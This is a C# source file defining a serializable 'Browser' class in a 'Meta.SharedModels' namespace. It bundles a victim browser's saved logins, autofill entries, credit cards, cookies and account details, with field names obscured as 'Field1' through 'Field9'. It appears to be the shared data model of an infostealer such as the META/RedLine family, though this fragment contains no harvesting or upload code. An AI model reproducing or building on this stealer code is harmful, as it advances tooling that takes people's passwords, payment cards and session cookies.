using ProtoBuf;
using System.Collections.Generic;
using System.Runtime.Serialization;

namespace Meta.SharedModels;

[ProtoContract(Name = "Browser")]
[DataContract(Name = "FieldRoot9", Namespace = "exampleNs")]
public class Browser
{
    [ProtoMember(1, Name = "Name")]
    [DataMember(Name = "Field1")]
    public string Name { get; set; }

    [DataMember(Name = "Field2")]
    [ProtoMember(2, Name = "Profile")]
    public string Profile { get; set; }

    [DataMember(Name = "Field3")]
    [ProtoMember(3, Name = "Credentials")]
    public IList<LoginPair> Credentials { get; set; }

    [DataMember(Name = "Field4")]
    [ProtoMember(4, Name = "Autofills")]
    public IList<Autofill> Autofills { get; set; }

    [ProtoMember(5, Name = "CreditCards")]
    [DataMember(Name = "Field5")]
    public IList<CreditCard> CreditCards { get; set; }

    [ProtoMember(6, Name = "Cookies")]
    [DataMember(Name = "Field6")]
    public IList<Cookie> Cookies { get; set; }

    [ProtoMember(7, Name = "AccountDetails")]
    [DataMember(Name = "Field8")]
    public AccountDetails AccountDetails { get; set; }

    [ProtoMember(8, Name = "UserAgent")]
    [DataMember(Name = "Field9")]
    public string UserAgent { get; set; }

    public bool IsEmpty()
    {
        bool result = true;
        IList<LoginPair> credentials = Credentials;
        if (credentials != null && credentials.Count > 0)
        {
            result = false;
        }
        IList<Autofill> autofills = Autofills;
        if (autofills != null && autofills.Count > 0)
        {
            result = false;
        }
        IList<CreditCard> creditCards = CreditCards;
        if (creditCards != null && creditCards.Count > 0)
        {
            result = false;
        }
        IList<Cookie> cookies = Cookies;
        if (cookies != null && cookies.Count > 0)
        {
            result = false;
        }
        return result;
    }
}
